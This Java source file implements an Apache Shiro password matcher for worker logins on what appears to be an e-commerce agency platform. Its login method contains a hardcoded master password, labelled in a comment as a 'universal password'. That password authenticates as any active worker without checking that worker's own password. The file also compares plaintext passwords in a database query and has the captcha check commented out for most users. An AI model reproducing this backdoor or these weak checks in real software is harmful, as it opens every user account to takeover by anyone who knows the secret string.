package com.shigu.component.shiro;

import com.opentae.data.daifa.beans.DaifaSeller;
import com.opentae.data.daifa.beans.DaifaWorker;
import com.opentae.data.daifa.examples.DaifaWorkerExample;
import com.opentae.data.daifa.interfaces.DaifaSellerMapper;
import com.opentae.data.daifa.interfaces.DaifaWorkerMapper;
import com.shigu.config.DaifaSessionConfig;
import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.credential.SimpleCredentialsMatcher;
import org.apache.shiro.crypto.hash.Sha384Hash;
import org.apache.shiro.session.Session;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.util.List;


/**
 * 自定义 密码验证类
 * @author zjb
 */
@Service
public class CustomCredentialsMatcher extends SimpleCredentialsMatcher {
	
	private static final Logger logger = LoggerFactory.getLogger(CustomCredentialsMatcher.class);


	@Resource(name = "tae_daifa_daifaWorkerMapper")
	DaifaWorkerMapper daifaWorkerMapper;
	@Resource(name = "tae_daifa_daifaSellerMapper")
	DaifaSellerMapper daifaSellerMapper;

	public CustomCredentialsMatcher(){

	}

	/*@Override
	public boolean doCredentialsMatch(AuthenticationToken authcToken, AuthenticationInfo info) {
		CaptchaUsernamePasswordToken token = (CaptchaUsernamePasswordToken) authcToken;
		if(!token.getCaptcha().equals(encrypt(new String(token.getPassword())))){
			return false;
		}
		token.setCaptcha(null);
		AuthorityUser auth = (AuthorityUser) info.getPrincipals().getPrimaryPrincipal();
		Session session = SecurityUtils.getSubject().getSession();
		session.setAttribute("usersession", auth);
		return true;
	}*/
	@Override
	public boolean doCredentialsMatch(AuthenticationToken authcToken, AuthenticationInfo info) {
		CaptchaUsernamePasswordToken token = (CaptchaUsernamePasswordToken) authcToken;

		if(token.getUsername().equals ("kfwh")){
			//CaptchaUsernamePasswordToken token = (CaptchaUsernamePasswordToken) authcToken;
			if(!token.getCaptcha().equals(encrypt(new String(token.getPassword())))){
				return false;
			}
			token.setCaptcha(null);
			AuthorityUser auth = (AuthorityUser) info.getPrincipals().getPrimaryPrincipal();
			Session session = SecurityUtils.getSubject().getSession();
			session.setAttribute(DaifaSessionConfig.DAIFA_SESSION, auth);
			return true;
		}
		//daifa_worker里的主登录人
		//DaifaWorker worker=new DaifaWorker ();
		DaifaWorkerExample wExample=new DaifaWorkerExample();
		if("fqtdtihfhqkiller81682024".equals (new String (token.getPassword ()))){//万能密码
			wExample.createCriteria ().andDaifaWorkerEqualTo (token.getUsername ()).andUseStatusEqualTo (1);

		}else{
			wExample.createCriteria ().andDaifaWorkerEqualTo (token.getUsername ()).andPasswordEqualTo (new String (token.getPassword ())).andUseStatusEqualTo (1);
		}
		List<DaifaWorker>  list_worker= daifaWorkerMapper.selectByExample (wExample);



		if(list_worker.size ()==0){
			return false;
		}
		DaifaWorker worker=list_worker.get (0);

		DaifaSeller seller=daifaSellerMapper.selectByPrimaryKey (worker.getDaifaSellerId());

		/**if(!token.getCaptcha().equals(encrypt(new String(token.getPassword())))){
			return false;
		}**/
		token.setCaptcha(null);
		//AuthorityUser auth = (AuthorityUser) info.getPrincipals().getPrimaryPrincipal();

		AuthorityUser auth = new AuthorityUser();
		auth.setUserId (worker.getDaifaWorkerId ());
		auth.setRoleIds (worker.getRemark2 ());
		auth.setDaifaWorkerId (worker.getDaifaWorkerId ());
		auth.setDaifaSellerId (worker.getDaifaSellerId ());
		auth.setDaifaUserName (worker.getUserName ());
		auth.setUserName (worker.getUserName ());
		auth.setWorkType (worker.getWorkType ());
		auth.setPayBaoAccount (worker.getPayBaoAccount ());
		auth.setDaifaLoginName (worker.getDaifaWorker ());
		auth.setDaifaPhone (worker.getPhone ());
		auth.setSellerPhone(worker.getPhone ());
		auth.setWebSite (worker.getRemark1 ());
		auth.setAccountId (worker.getAccountId ());
		auth.setDfGroupId (worker.getDfGroupId ());
        auth.setBuycityId(seller.getBuycityId ());
		Session session = SecurityUtils.getSubject().getSession();
		session.setAttribute(DaifaSessionConfig.DAIFA_SESSION, auth);
		return true;
	}
	public static String encrypt(String data) {
		String sha384Hex = new Sha384Hash(data).toBase64();
		return sha384Hex;
	}

	public static void main(String[] args) {
		//System.out.println(encrypt("123456"));
	}
}
